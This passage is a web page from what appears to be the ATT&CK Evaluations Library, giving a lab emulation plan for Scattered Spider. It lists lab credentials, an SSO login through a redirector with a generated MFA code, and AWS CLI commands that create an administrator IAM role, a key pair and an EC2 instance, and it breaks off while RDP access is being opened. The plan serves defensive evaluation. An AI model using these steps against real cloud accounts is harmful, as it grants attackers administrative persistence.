@@ -1,0 +1,987 @@
+<!DOCTYPE html>
+<html lang="en" class="h-full">
+<head>
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-ST8G6EL3M2"></script>
+    <script data-cfasync="false">window.dataLayer = window.dataLayer || [];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());gtag('config', 'G-ST8G6EL3M2');</script>
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <meta name="turbo-root" content="/ael">
+    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="3.11.0.818693826522">
+
+    <!-- See retype.com -->
+    <meta name="generator" content="Retype 3.11.0">
+
+    <!-- Primary Meta Tags -->
+    <title>Protections Test 7 Scenario</title>
+    <meta name="title" content="Protections Test 7 Scenario">
+    <meta name="description" content="☣️ Initiate an RDP session to the Kali attack host driftmark (174.3.0.70)">
+
+    <!-- Canonical -->
+    <link rel="canonical" href="https://attackevals.github.io/ael/enterprise/scattered_spider/emulation_plan/protections_test_7_scenario/">
+
+    <!-- Open Graph / Facebook -->
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://attackevals.github.io/ael/enterprise/scattered_spider/emulation_plan/protections_test_7_scenario/">
+    <meta property="og:title" content="Protections Test 7 Scenario">
+    <meta property="og:description" content="☣️ Initiate an RDP session to the Kali attack host driftmark (174.3.0.70)">
+
+    <!-- Twitter -->
+    <meta property="twitter:card" content="summary_large_image">
+    <meta property="twitter:url" content="https://attackevals.github.io/ael/enterprise/scattered_spider/emulation_plan/protections_test_7_scenario/">
+    <meta property="twitter:title" content="Protections Test 7 Scenario">
+    <meta property="twitter:description" content="☣️ Initiate an RDP session to the Kali attack host driftmark (174.3.0.70)">
+
+    <script data-cfasync="false">(function(){var cl=document.documentElement.classList,ls=localStorage.getItem("retype_scheme"),hd=cl.contains("dark"),hl=cl.contains("light"),wm=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches;if(ls==="dark"||(!ls&&wm&&!hd&&!hl)){cl.remove("light");cl.add("dark")}else if(ls==="light"||(!ls&&!wm&&!hd&&!hl)){cl.remove("dark");cl.add("light")}})();</script>
+
+    <link href="../../../../favicon.png" rel="icon">
+    <link href="../../../../resources/css/retype.css?v=3.11.0.818693826522" rel="stylesheet">
+
+    <script data-cfasync="false" src="../../../../resources/js/config.js?v=3.11.0.818693826522" data-turbo-eval="false" defer></script>
+    <script data-cfasync="false" src="../../../../resources/js/retype.js?v=3.11.0" data-turbo-eval="false" defer></script>
+    <script id="lunr-js" data-cfasync="false" src="../../../../resources/js/lunr.js?v=3.11.0.818693826522" data-turbo-eval="false" defer></script>
+    <script id="prism-js" data-cfasync="false" src="../../../../resources/js/prism.js?v=3.11.0.818693826522" defer></script>
+</head>
+<body>
+    <div id="retype-app" class="relative text-base antialiased text-base-text bg-base-bg font-body">
+        <div class="absolute bottom-0 left-0" style="top: 5rem; right: 50%"></div>
+    
+        <header id="retype-header" class="sticky top-0 z-30 flex w-full h-16 bg-header-bg border-b border-header-border md:h-20">
+            <div class="container relative flex items-center justify-between pr-6 grow md:justify-start">
+                <!-- Mobile menu button skeleton -->
+                <button v-cloak class="skeleton retype-mobile-menu-button flex items-center justify-center shrink-0 overflow-hidden dark:text-white focus:outline-none rounded-full w-10 h-10 ml-3.5 md:hidden"><svg xmlns="http://www.w3.org/2000/svg" class="mb-px shrink-0" width="24" height="24" viewBox="0 0 24 24" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor"><path d="M2 4h20v2H2zM2 11h20v2H2zM2 18h20v2H2z"></path></g></svg></button>
+                <div v-cloak id="retype-sidebar-left-toggle-button"></div>
+        
+                <!-- Logo -->
+                <div class="flex items-center justify-between h-full py-2 md:w-75">
+                    <div class="flex items-center px-2 md:px-6">
+                        <a id="retype-branding-logo" href="../../../../" class="flex items-center leading-snug text-xl">
+                            <span class="w-10 mr-2 grow-0 shrink-0 overflow-hidden">
+                                <img class="max-h-10 dark:hidden md:inline-block" src="../../../../images/attackevals-logo.png">
+                                <img class="max-h-10 hidden dark:inline-block" src="../../../../images/attackevals-logo.png">
+                            </span>
+                            <span class="dark:text-white font-bold line-clamp-1 md:line-clamp-2">ATTACK Evaluation Library</span>
+                        </a>
+                    </div>
+        
+                    <span class="hidden h-8 border-r md:inline-block border-base-border"></span>
+                </div>
+        
+                <div class="flex justify-between md:grow">
+                    <!-- Top Nav -->
+                    <nav id="retype-header-nav" class="hidden md:flex">
+                        <ul class="flex flex-col mb-4 md:pl-16 md:mb-0 md:flex-row md:items-center">
+                            <li class="mr-6">
+                                <a class="py-2 md:mb-0 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-header-text font-header-text-weight hover:text-header-text-hover" href="https://attackevals.mitre-engenuity.org">Attack Evaluations</a>
+                            </li>
+        
+                        </ul>
+                    </nav>
+        
+                    <!-- Header Right Skeleton -->
+                    <div v-cloak class="flex justify-end grow skeleton">
+        
+                        <!-- Search input mock -->
+                        <div class="relative hidden w-40 lg:block lg:max-w-sm lg:ml-auto">
+                            <div class="absolute flex items-center justify-center h-full pl-3 dark:text-dark-300">
+                                <svg xmlns="http://www.w3.org/2000/svg" class="icon-base" width="16" height="16" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 1px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
+                            </div>
+                            <input class="w-full h-10 placeholder-search-placeholder transition-colors duration-200 ease-in bg-search-bg border border-transparent rounded md:text-sm hover:border-search-border-hover focus:outline-none focus:border-search-border-focus" style="padding: 0.625rem 0.75rem 0.625rem 2rem" type="text" placeholder="Search">
+                        </div>
+        
+                        <!-- Mobile search button -->
+                        <div class="flex items-center justify-center w-10 h-10 lg:hidden">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="shrink-0 icon-base" width="20" height="20" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
+                        </div>
+        
+                        <!-- Dark mode switch placeholder -->
+                        <div class="w-10 h-10 lg:ml-2"></div>
+        
+                        <!-- History button -->
+                        <div class="flex items-center justify-center w-10 h-10" style="margin-right: -0.625rem;">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="shrink-0 icon-base" width="22" height="22" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor" ><g ><path d="M12.01 6.01c-.55 0-1 .45-1 1V12a1 1 0 00.4.8l3 2.22a.985.985 0 001.39-.2.996.996 0 00-.21-1.4l-2.6-1.92V7.01c.02-.55-.43-1-.98-1z"></path><path d="M12.01 1.91c-5.33 0-9.69 4.16-10.05 9.4l-.29-.26a.997.997 0 10-1.34 1.48l1.97 1.79c.19.17.43.26.67.26s.48-.09.67-.26l1.97-1.79a.997.997 0 10-1.34-1.48l-.31.28c.34-4.14 3.82-7.41 8.05-7.41 4.46 0 8.08 3.63 8.08 8.09s-3.63 8.08-8.08 8.08c-2.18 0-4.22-.85-5.75-2.4a.996.996 0 10-1.42 1.4 10.02 10.02 0 007.17 2.99c5.56 0 10.08-4.52 10.08-10.08.01-5.56-4.52-10.09-10.08-10.09z"></path></g></g></svg>
+                        </div>
+                    </div>
+        
+                    <div v-cloak class="flex justify-end grow">
+                        <div id="retype-mobile-search-button"></div>
+                        <doc-search-desktop></doc-search-desktop>
+        
+                        <doc-theme-switch class="lg:ml-2"></doc-theme-switch>
+                        <doc-history></doc-history>
+                    </div>
+                </div>
+            </div>
+        </header>
+    
+    
+        <div id="retype-container" class="container relative flex bg-white">
+            <!-- Sidebar Skeleton -->
+            <div v-cloak class="fixed flex flex-col shrink-0 duration-300 ease-in-out bg-sidebar-left-bg border-sidebar-left-border sidebar top-20 w-75 border-r h-screen md:sticky transition-transform skeleton">
+            
+                <div class="flex items-center h-16 px-6">
+                    <input class="w-full h-8 px-3 py-2 transition-colors duration-200 ease-linear bg-filter-bg border border-filter-border rounded shadow-none text-sm focus:outline-none focus:border-filter-border-focus" type="text" placeholder="Filter">
+                </div>
+            
+                <div class="pl-6 mt-1 mb-4">
+                    <div class="w-32 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                    <div class="w-48 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                    <div class="w-40 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                    <div class="w-32 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                    <div class="w-48 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                    <div class="w-40 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                </div>
+            
+            </div>
+            
+            <!-- Sidebar component -->
+            <doc-sidebar v-cloak>
+                <template #sidebar-footer>
+                    <div class="shrink-0 mt-auto border-t md:bg-transparent md:border-none dark:border-base-border">
+            
+                        <div class="py-3 px-6 md:hidden border-b dark:border-base-border">
+                            <nav>
+                                <ul class="flex flex-wrap justify-center items-center">
+                                    <li class="mr-6">
+                                        <a class="block py-1 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-header-text font-header-text-weight hover:text-header-text-hover" href="https://attackevals.mitre-engenuity.org">Attack Evaluations</a>
+                                    </li>
+            
+                                </ul>
+                            </nav>
+                        </div>
+                    </div>
+                </template>
+            </doc-sidebar>
+    
+            <div class="grow min-w-0 bg-body-bg">
+                <!-- Render "toolbar" template here on api pages --><!-- Render page content -->
+                <div class="flex">
+                    <div id="retype-main" class="min-w-0 p-4 grow md:px-16">
+                        <main class="relative pb-12 lg:pt-2">
+                            <div class="retype-markdown" id="retype-content">
+                                <!-- Rendered if sidebar right is enabled -->
+                                <div id="retype-sidebar-right-toggle"></div>
+                                <nav id="retype-breadcrumb" class="breadcrumb" aria-label="Breadcrumb">
+                                    <ol role="list">
+                                        <li class="pr-4">
+                                            <a href="../../../../" class="pr-4">
+                                                ATT&​CK Evaluations Library
+                                            </a>
+                                            <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" width="18" height="18" viewBox="0 0 24 24" aria-hidden="true">
+                                                <path d="M8.72 18.78a.75.75 0 0 1 0-1.06L14.44 12 8.72 6.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0Z"/>
+                                            </svg>
+                                        </li>
+                                        <li class="pr-4">
+                                            <span class="pr-4">
+                                                Enterprise
+                                            </span>
+                                            <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" width="18" height="18" viewBox="0 0 24 24" aria-hidden="true">
+                                                <path d="M8.72 18.78a.75.75 0 0 1 0-1.06L14.44 12 8.72 6.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0Z"/>
+                                            </svg>
+                                        </li>
+                                        <li class="pr-4">
+                                            <a href="../../../../enterprise/scattered_spider/" class="pr-4">
+                                                Scattered Spider
+                                            </a>
+                                            <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" width="18" height="18" viewBox="0 0 24 24" aria-hidden="true">
+                                                <path d="M8.72 18.78a.75.75 0 0 1 0-1.06L14.44 12 8.72 6.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0Z"/>
+                                            </svg>
+                                        </li>
+                                        <li class="pr-4">
+                                            <a href="../../../../enterprise/scattered_spider/emulation_plan/" class="pr-4">
+                                                Scattered Spider Emulation Plans
+                                            </a>
+                                            <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" width="18" height="18" viewBox="0 0 24 24" aria-hidden="true">
+                                                <path d="M8.72 18.78a.75.75 0 0 1 0-1.06L14.44 12 8.72 6.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0Z"/>
+                                            </svg>
+                                        </li>
+                                        <li class="pr-4">
+                                            <a href="../../../../enterprise/scattered_spider/emulation_plan/protections_test_7_scenario/" class="pr-4">
+                                                Protections Test 7 Scenario
+                                            </a>
+                                        </li>
+                                    </ol>
+                                </nav>
+                
+                                <!-- Page content  -->
+<doc-anchor-target id="protections-test-7-scenario" class="break-words">
+    <h1>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#protections-test-7-scenario">#</doc-anchor-trigger>
+        <span>Protections Test 7 Scenario</span>
+    </h1>
+</doc-anchor-target>
+<doc-anchor-target id="step-0---setup">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#step-0---setup">#</doc-anchor-trigger>
+        <span>Step 0 - Setup</span>
+    </h2>
+</doc-anchor-target>
+<doc-anchor-target id="procedures">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#procedures">#</doc-anchor-trigger>
+        <span>Procedures</span>
+    </h3>
+</doc-anchor-target>
+<ul>
+<li><p><span class="docs-emoji">&#x2623;&#xFE0F;</span> Initiate an RDP session to the Kali attack host <code v-pre>driftmark (174.3.0.70)</code></p>
+<div class="table-wrapper scrollbar overflow-hidden">
+<table class="comfortable">
+<thead>
+<tr>
+<th>Destination</th>
+<th>Username</th>
+<th>Password</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>174.3.0.70</td>
+<td>op1</td>
+<td>Barbed-Directive</td>
+</tr>
+</tbody>
+</table>
+</div>
+</li>
+</ul>
+<doc-anchor-target id="step-1---initial-access">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#step-1---initial-access">#</doc-anchor-trigger>
+        <span>Step 1 - Initial Access</span>
+    </h2>
+</doc-anchor-target>
+<doc-anchor-target id="voice-track">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#voice-track">#</doc-anchor-trigger>
+        <span>Voice Track</span>
+    </h3>
+</doc-anchor-target>
+<p>Step 1 emulates Scattered Spider using a compromised cloud administrator <code v-pre>sstark</code> for the
+vale domain to log in to the SSO dashboard (<code v-pre>https://sso.vale.net/</code>). After
+logging in to the SSO dashboard, Scattered Spider is able to access the AWS console
+through SSO. With access to the AWS console, Scattered Spider uses CloudShell to create
+an IAM role with administrative access and a key pair for use in creating an EC2
+instance.</p>
+<doc-anchor-target id="procedures-1">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#procedures-1">#</doc-anchor-trigger>
+        <span>Procedures</span>
+    </h3>
+</doc-anchor-target>
+<ul>
+<li><p><span class="docs-emoji">&#x2623;&#xFE0F;</span> From Kali, open a new browser window then navigate to the redirector link.
+This should redirect to the victim SSO dashboard (<code v-pre>https://sso.vale.net/</code>). Log
+in using the provided SSO credentials.</p>
+<div class="table-wrapper scrollbar overflow-hidden">
+<table class="comfortable">
+<thead>
+<tr>
+<th>Destination</th>
+<th>Username</th>
+<th>Password</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><a href="https://goldcloaks.org">https://goldcloaks.org</a></td>
+<td>sstark</td>
+<td>Flourish-Paradox</td>
+</tr>
+</tbody>
+</table>
+</div>
+</li>
+<li><p><span class="docs-emoji">&#x2623;&#xFE0F;</span> When prompted for an MFA token, open a terminal in Kali and run the follow
+command, entering the following password when prompted then copy and paste the
+OTP into the SSO portal to log in</p>
+<div class="table-wrapper scrollbar overflow-hidden">
+<table class="comfortable">
+<thead>
+<tr>
+<th>Password</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Decode-Acclimate</td>
+</tr>
+</tbody>
+</table>
+</div>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">totp-cli generate --follow vale vale-sstark</code></pre>
+</doc-codeblock></div>
+<ul>
+<li><p><em><strong>Expected Output</strong></em></p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-none"><code v-pre class="language-none">######</code></pre>
+</doc-codeblock></div>
+</li>
+</ul>
+</li>
+<li><p><span class="docs-emoji">&#x2623;&#xFE0F;</span> From the SSO dashboard, click on AWS. In the AWS console, ensure the region
+is set to <code v-pre>us-east-1</code></p>
+</li>
+<li><p><span class="docs-emoji">&#x2623;&#xFE0F;</span> In the AWS console, search for and open &quot;CloudShell&quot;. Run the following
+commands to create an IAM role and profile with administrator access:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">aws iam create-role --role-name sisterton-role --assume-role-policy-document '{&quot;Version&quot;: &quot;2012-10-17&quot;,&quot;Statement&quot;: [{&quot;Effect&quot;: &quot;Allow&quot;,&quot;Action&quot;: [&quot;sts:AssumeRole&quot;],&quot;Principal&quot;: {&quot;Service&quot;: [&quot;ec2.amazonaws.com&quot;]}}]}' --description &quot;IAM role for sisterton&quot;;
+aws iam attach-role-policy --role-name sisterton-role --policy-arn &quot;arn:aws:iam::aws:policy/AdministratorAccess&quot;;
+aws iam create-instance-profile --instance-profile-name sisterton-role;
+aws iam add-role-to-instance-profile --instance-profile-name sisterton-role --role-name sisterton-role</code></pre>
+</doc-codeblock></div>
+<ul>
+<li><p><em><strong>Expected Output</strong></em></p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-none"><code v-pre class="language-none">{
+    &quot;Role&quot;: {
+        &quot;Path&quot;: &quot;/&quot;,
+        &quot;RoleName&quot;: &quot;sisterton-role&quot;,
+        &quot;RoleId&quot;: &quot;...&quot;,
+        &quot;Arn&quot;: &quot;arn:aws:iam::...:role/sisterton-role&quot;,
+        &quot;CreateDate&quot;: &quot;...&quot;,
+        &quot;AssumeRolePolicyDocument&quot;: {
+            &quot;Version&quot;: &quot;2012-10-17&quot;,
+            &quot;Statement&quot;: [
+                {
+                    &quot;Effect&quot;: &quot;Allow&quot;,
+                    &quot;Action&quot;: [
+                        &quot;sts:AssumeRole&quot;
+                    ],
+                    &quot;Principal&quot;: {
+                        &quot;Service&quot;: [
+                            &quot;ec2.amazonaws.com&quot;
+                        ]
+                    }
+                }
+            ]
+        }
+    }
+}
+
+{
+    &quot;InstanceProfile&quot;: {
+        &quot;Path&quot;: &quot;/&quot;,
+        &quot;InstanceProfileName&quot;: &quot;sisterton-role&quot;,
+        &quot;InstanceProfileId&quot;: &quot;...&quot;,
+        &quot;Arn&quot;: &quot;arn:aws:iam::...:instance-profile/sisterton-role&quot;,
+        &quot;CreateDate&quot;: &quot;...&quot;,
+        &quot;Roles&quot;: []
+    }
+}</code></pre>
+</doc-codeblock></div>
+</li>
+</ul>
+</li>
+<li><p><span class="docs-emoji">&#x2623;&#xFE0F;</span> In the same CloudShell terminal session, run the following command to create
+an SSH key pair. Copy the private key output and save the contents in a text
+file on Kali.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">aws ec2 create-key-pair --key-name sisterton --key-type rsa --key-format pem --query &quot;KeyMaterial&quot; --output text</code></pre>
+</doc-codeblock></div>
+<ul>
+<li><p><em><strong>Expected Output</strong></em></p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-none"><code v-pre class="language-none">-----BEGIN RSA PRIVATE KEY-----
+...
+...
+-----END RSA PRIVATE KEY-----</code></pre>
+</doc-codeblock></div>
+</li>
+</ul>
+</li>
+<li><p><span class="docs-emoji">&#x2623;&#xFE0F;</span> In the AWS console, search for and open &quot;CloudShell&quot;. Run the following
+commands to create a Windows EC2 instance and assign the previously created IAM
+profile, key, and role to the instance:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">vpc_id=$(aws ec2 describe-vpcs --filters Name=tag:Name,Values=REPLACE_WITH_VPC_NAME | jq -r -c '[.Vpcs | .[]][0].VpcId');
+subnet_id=$(aws ec2 describe-subnets --filters Name=vpc-id,Values=$vpc_id Name=cidr-block,Values=10.212.3.0/24| jq -r -c '[.Subnets | .[]][0].SubnetId');
+group_id=$(aws ec2 describe-security-groups --filters Name=group-name,Values=REPLACE_WITH_SECURITY_GROUP_NAME* | jq -r -c '[.SecurityGroups | .[]][0].GroupId');
+image_id=ami-036bd412dc38dc55c;
+result=$(aws ec2 run-instances --image-id &quot;$image_id&quot; \
+    --instance-type &quot;t3.large&quot; \
+    --block-device-mappings '{&quot;DeviceName&quot;:&quot;/dev/sda1&quot;,&quot;Ebs&quot;:{&quot;Encrypted&quot;:false,&quot;DeleteOnTermination&quot;:true,&quot;Iops&quot;:3000,&quot;VolumeSize&quot;:30,&quot;VolumeType&quot;:&quot;gp3&quot;,&quot;Throughput&quot;:125}}' \
+    --network-interfaces '{&quot;SubnetId&quot;:&quot;'$subnet_id'&quot;,&quot;DeleteOnTermination&quot;:true,&quot;AssociatePublicIpAddress&quot;:false,&quot;DeviceIndex&quot;:0,&quot;PrivateIpAddresses&quot;:[{&quot;Primary&quot;:true,&quot;PrivateIpAddress&quot;:&quot;10.115.5.100&quot;}],&quot;Groups&quot;:[&quot;'$group_id'&quot;]}' \
+    --credit-specification '{&quot;CpuCredits&quot;:&quot;unlimited&quot;}' \
+    --tag-specifications '{&quot;ResourceType&quot;:&quot;instance&quot;,&quot;Tags&quot;:[{&quot;Key&quot;:&quot;Name&quot;,&quot;Value&quot;:&quot;sisterton&quot;},{&quot;Key&quot;:&quot;Hostname&quot;,&quot;Value&quot;:&quot;sisterton&quot;}]}' \
+    --metadata-options '{&quot;HttpEndpoint&quot;:&quot;enabled&quot;,&quot;HttpPutResponseHopLimit&quot;:2,&quot;HttpTokens&quot;:&quot;required&quot;}' \
+    --private-dns-name-options '{&quot;HostnameType&quot;:&quot;ip-name&quot;,&quot;EnableResourceNameDnsARecord&quot;:true,&quot;EnableResourceNameDnsAAAARecord&quot;:false}' \
+    --count &quot;1&quot; --key-name &quot;sisterton&quot; --user-data &quot;$user_data&quot; --iam-instance-profile '{&quot;Name&quot;:&quot;sisterton-role&quot;}');
+echo $result | jq;</code></pre>
+</doc-codeblock></div>
+<ul>
+<li><p><em><strong>Expected Output</strong></em></p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-none"><code v-pre class="language-none">{
+  &quot;ReservationId&quot;: &quot;...&quot;,
+  &quot;OwnerId&quot;: &quot;...&quot;,
+  &quot;Groups&quot;: [],
+  &quot;Instances&quot;: [
+    {
+      &quot;Architecture&quot;: &quot;x86_64&quot;,
+      &quot;BlockDeviceMappings&quot;: [],
+      &quot;ClientToken&quot;: &quot;...&quot;,
+      &quot;EbsOptimized&quot;: false,
+      &quot;EnaSupport&quot;: true,
+      &quot;Hypervisor&quot;: &quot;xen&quot;,
+      &quot;IamInstanceProfile&quot;: {
+        &quot;Arn&quot;: &quot;arn:aws:iam::...:instance-profile/sisterton-role&quot;,
+        &quot;Id&quot;: &quot;...&quot;
+      },
+      &quot;NetworkInterfaces&quot;: [
+        {
+          &quot;Attachment&quot;: {
+            &quot;AttachTime&quot;: &quot;...&quot;,
+            &quot;AttachmentId&quot;: &quot;...&quot;,
+            &quot;DeleteOnTermination&quot;: true,
+            &quot;DeviceIndex&quot;: 0,
+            &quot;Status&quot;: &quot;attaching&quot;,
+            &quot;NetworkCardIndex&quot;: 0
+          },
+          &quot;Description&quot;: &quot;&quot;,
+          &quot;Groups&quot;: [
+            {
+              &quot;GroupId&quot;: &quot;...&quot;,
+              &quot;GroupName&quot;: &quot;REPLACE_WITH_SECURITY_GROUP_NAME&quot;
+            }
+          ],
+          &quot;Ipv6Addresses&quot;: [],
+          &quot;MacAddress&quot;: &quot;...&quot;,
+          &quot;NetworkInterfaceId&quot;: &quot;...&quot;,
+          &quot;OwnerId&quot;: &quot;...&quot;,
+          &quot;PrivateDnsName&quot;: &quot;...&quot;,
+          &quot;PrivateIpAddress&quot;: &quot;...&quot;,
+          &quot;PrivateIpAddresses&quot;: [
+            {
+              &quot;Primary&quot;: true,
+              &quot;PrivateDnsName&quot;: &quot;...&quot;,
+              &quot;PrivateIpAddress&quot;: &quot;...&quot;
+            }
+          ],
+          &quot;SourceDestCheck&quot;: true,
+          &quot;Status&quot;: &quot;in-use&quot;,
+          &quot;SubnetId&quot;: &quot;...&quot;,
+          &quot;VpcId&quot;: &quot;...&quot;,
+          &quot;InterfaceType&quot;: &quot;interface&quot;,
+          &quot;Operator&quot;: {
+            &quot;Managed&quot;: false
+          }
+        }
+      ],
+      &quot;RootDeviceName&quot;: &quot;/dev/sda1&quot;,
+      &quot;RootDeviceType&quot;: &quot;ebs&quot;,
+      &quot;SecurityGroups&quot;: [
+        {
+          &quot;GroupId&quot;: &quot;...&quot;,
+          &quot;GroupName&quot;: &quot;REPLACE_WITH_SECURITY_GROUP_NAME&quot;
+        }
+      ],
+      &quot;SourceDestCheck&quot;: true,
+      &quot;StateReason&quot;: {
+        &quot;Code&quot;: &quot;pending&quot;,
+        &quot;Message&quot;: &quot;pending&quot;
+      },
+      &quot;Tags&quot;: [
+        {
+          &quot;Key&quot;: &quot;Hostname&quot;,
+          &quot;Value&quot;: &quot;sisterton&quot;
+        },
+        {
+          &quot;Key&quot;: &quot;Name&quot;,
+          &quot;Value&quot;: &quot;sisterton&quot;
+        }
+      ],
+      &quot;VirtualizationType&quot;: &quot;hvm&quot;,
+      &quot;CpuOptions&quot;: {
+        &quot;CoreCount&quot;: 1,
+        &quot;ThreadsPerCore&quot;: 2
+      },
+      &quot;CapacityReservationSpecification&quot;: {
+        &quot;CapacityReservationPreference&quot;: &quot;open&quot;
+      },
+      &quot;MetadataOptions&quot;: {
+        &quot;State&quot;: &quot;pending&quot;,
+        &quot;HttpTokens&quot;: &quot;required&quot;,
+        &quot;HttpPutResponseHopLimit&quot;: 2,
+        &quot;HttpEndpoint&quot;: &quot;enabled&quot;,
+        &quot;HttpProtocolIpv6&quot;: &quot;disabled&quot;,
+        &quot;InstanceMetadataTags&quot;: &quot;disabled&quot;
+      },
+      &quot;EnclaveOptions&quot;: {
+        &quot;Enabled&quot;: false
+      },
+      &quot;PrivateDnsNameOptions&quot;: {
+        &quot;HostnameType&quot;: &quot;ip-name&quot;,
+        &quot;EnableResourceNameDnsARecord&quot;: true,
+        &quot;EnableResourceNameDnsAAAARecord&quot;: false
+      },
+      &quot;MaintenanceOptions&quot;: {
+        &quot;AutoRecovery&quot;: &quot;default&quot;
+      },
+      &quot;CurrentInstanceBootMode&quot;: &quot;legacy-bios&quot;,
+      &quot;Operator&quot;: {
+        &quot;Managed&quot;: false
+      },
+      &quot;InstanceId&quot;: &quot;...&quot;,
+      &quot;ImageId&quot;: &quot;ami-0c765d44cf1f25d26&quot;,
+      &quot;State&quot;: {
+        &quot;Code&quot;: 0,
+        &quot;Name&quot;: &quot;pending&quot;
+      },
+      &quot;PrivateDnsName&quot;: &quot;...&quot;,
+      &quot;PublicDnsName&quot;: &quot;&quot;,
+      &quot;StateTransitionReason&quot;: &quot;&quot;,
+      &quot;KeyName&quot;: &quot;sisterton&quot;,
+      &quot;AmiLaunchIndex&quot;: 0,
+      &quot;ProductCodes&quot;: [],
+      &quot;InstanceType&quot;: &quot;t3.large&quot;,
+      &quot;LaunchTime&quot;: &quot;...&quot;,
+      &quot;Placement&quot;: {
+        &quot;GroupName&quot;: &quot;&quot;,
+        &quot;Tenancy&quot;: &quot;default&quot;,
+        &quot;AvailabilityZone&quot;: &quot;...&quot;
+      },
+      &quot;Platform&quot;: &quot;windows&quot;,
+      &quot;Monitoring&quot;: {
+        &quot;State&quot;: &quot;disabled&quot;
+      },
+      &quot;SubnetId&quot;: &quot;...&quot;,
+      &quot;VpcId&quot;: &quot;...&quot;,
+      &quot;PrivateIpAddress&quot;: &quot;10.115.5.100&quot;
+    }
+  ]
+}</code></pre>
+</doc-codeblock></div>
+</li>
+</ul>
+</li>
+<li><p><span class="docs-emoji">&#x2623;&#xFE0F;</span> In the AWS console, search for &quot;EC2&quot;, and right-click to open the &quot;EC2&quot;
+console in a new tab. Under &quot;Instances&quot; click on &quot;Instances&quot; and verify that the
+newly created instance appears and is in the Running state.</p>
+</li>
+<li><p><span class="docs-emoji">&#x2623;&#xFE0F;</span> In the AWS EC2 console, in the left navigation pane under &quot;Network &amp;
+Security&quot; select &quot;Security Groups&quot;. Select the security group ID with the
+security group name following the pattern of <code v-pre>REPLACE_WITH_SECURITY_GROUP_NAME</code> to open the
+additional configuration details</p>
+</li>
+<li><p><span class="docs-emoji">&#x2623;&#xFE0F;</span> Click the &quot;Edit inbound rules&quot; button. In the &quot;Edit inbound rules&quot; page,
+click &quot;Add rule&quot; then set the &quot;Port range&quot; to <code v-pre>3389</code> and &quot;Source&quot; to
